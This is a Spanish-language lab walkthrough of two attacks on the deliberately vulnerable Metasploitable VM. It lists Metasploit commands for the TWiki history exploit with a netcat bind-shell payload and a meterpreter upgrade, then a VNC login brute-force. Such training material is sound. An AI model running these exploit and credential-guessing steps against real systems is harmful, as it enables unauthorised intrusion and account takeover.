# Ejemplo 1
<br>
  Acerca de:
  <br>
    -La máquina virtual Metasploitable es una versión intencionalmente vulnerable de Ubuntu Linux diseñada para probar herramientas de seguridad y demostrar vulnerabilidades comunes.
<br>

  Buscar vulnerabilidades:
  <br>
    -Ataquaremos al puerto 80
    -Para ello tendremos que usar la herramienta nmap con la que tendremos que poner "nmap -O 192.168.1.10" 192.168.1.10 es la ip que tenermos en la maquina a la cual vamos a atacar 
                                                                                                    
                                                                                                  
![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/190cde79-3c47-46d6-bf70-7bd082a6fa75)

-Iniciaremos la herramienta “metasploit framework”

 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/69871245-d7ca-4a04-8784-f92ce9e4a3fd)

-Después usaremos la herramienta twiki con el comando “use exploit/unix/webapp/twiki_history” en la que tendremos si podemos atacar al puerto que nos interese identificar con el comando “show options”
 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/ce0918a2-a729-44a7-ba80-33201418d83c)


Indicaremos cual es nuestro objetivo con el comando “set rhosts 192.168.1.10”
 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/f9c339eb-9c92-41d4-9fa8-5ce7741075f4)
![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/3dbcbd54-3ea7-4570-9b2b-55cc43f3f22a)


 

Para continuar tendremos que usar los siguientes comandos “set payload cmd/unix/bind_netcat”
 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/3403d27e-5900-4edf-a465-3b93fb1944e6)


 
Tendremos que crear una sesión con “exploit -j” y veremos si se ha creado con “sessions -l”
 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/fe13f062-4730-4f5d-9a18-cdc48dc267bb)


Tendremos que usar los siguientes comandos “use post/multi/manage/shell_to_meterpreter”, “set sessions 2” y “exploit”
 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/6b9ecb6b-f268-4db5-b4f0-6a81a3d6c2a0)


Ya podemos entrar en la maquina objetivo con el comando “sessions -i 3” y haremos un “ifconfig para confirmar si hemos entrado bien”
 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/71e9be85-3d5b-4099-b7b7-d8681aec1284)

# Ejemplo 2

<br>
-Atacaremos al puerto P 5900 VNC 

-Comprobaresmos si podemos usar el puerto 5900

<img width="385" alt="image" src="https://github.com/JavierPovedano/Seguridad/assets/117440210/b864e490-0d1a-4b31-a1ed-166a3c72ac08">

-Iniciaremos la herramienta “metasploit framework”

 ![image](https://github.com/JavierPovedano/Seguridad/assets/117440210/69871245-d7ca-4a04-8784-f92ce9e4a3fd)

-Vemos que opciones tenemos para usar vnc con "search vnc_login" y usamos el 0 con "use 0"

<img width="430" alt="image" src="https://github.com/JavierPovedano/Seguridad/assets/117440210/72507d21-b71b-4339-9f03-6e95c3d776cd">

-Indicamos el objetivo con "set rhosts 192.168.1.10" y que usuario usaremos con "set rhosts 192.168.1.10"

<img width="265" alt="image" src="https://github.com/JavierPovedano/Seguridad/assets/117440210/b82cf34d-7359-451f-8a36-57fdb1cfaf0c">

-Lo iniciaremos con "run" y nos dara la contraseña

<img width="307" alt="image" src="https://github.com/JavierPovedano/Seguridad/assets/117440210/83db20e4-0c63-440e-9655-2c967bc786d2">

-Pondremos en la terminal "vncviewer 192.168.1.10" y ya nos conectara 

<img width="530" alt="image" src="https://github.com/JavierPovedano/Seguridad/assets/117440210/517e517b-094f-4e63-a408-1e136f5e83ad">
